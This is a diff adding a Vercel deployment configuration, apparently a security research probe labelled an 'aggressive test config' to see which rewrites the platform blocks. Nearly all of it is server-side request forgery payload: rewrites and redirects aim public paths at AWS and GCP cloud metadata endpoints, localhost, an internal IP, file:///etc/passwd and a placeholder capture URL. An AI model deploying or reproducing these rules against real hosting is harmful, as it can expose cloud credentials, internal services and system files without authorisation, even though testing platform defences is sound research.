@@ -1,0 +1,54 @@
+{
+  "version": 2,
+  "$schema": "https://openapi.vercel.sh/vercel.json",
+  "_comment": "AGGRESSIVE TEST CONFIG - Deploy to test which rewrites Vercel blocks",
+  "rewrites": [
+    {
+      "source": "/proxy/:path*",
+      "destination": "https://REPLACE_WITH_CAPTURE_URL/:path*"
+    },
+    {
+      "source": "/metadata-aws",
+      "destination": "http://169.254.169.254/latest/meta-data/"
+    },
+    {
+      "source": "/metadata-gcp",
+      "destination": "http://metadata.google.internal/computeMetadata/v1/"
+    },
+    {
+      "source": "/localhost",
+      "destination": "http://127.0.0.1:3000/"
+    },
+    {
+      "source": "/internal-ip",
+      "destination": "http://10.0.0.1/"
+    },
+    {
+      "source": "/file-scheme",
+      "destination": "file:///etc/passwd"
+    }
+  ],
+  "redirects": [
+    {
+      "source": "/redirect-external",
+      "destination": "https://REPLACE_WITH_CAPTURE_URL/redirect-target",
+      "permanent": false
+    },
+    {
+      "source": "/redirect-metadata",
+      "destination": "http://169.254.169.254/",
+      "permanent": false
+    }
+  ],
+  "headers": [
+    {
+      "source": "/(.*)",
+      "headers": [
+        {
+          "key": "X-Research",
+          "value": "SysTrack"
+        }
+      ]
+    }
+  ]
+}
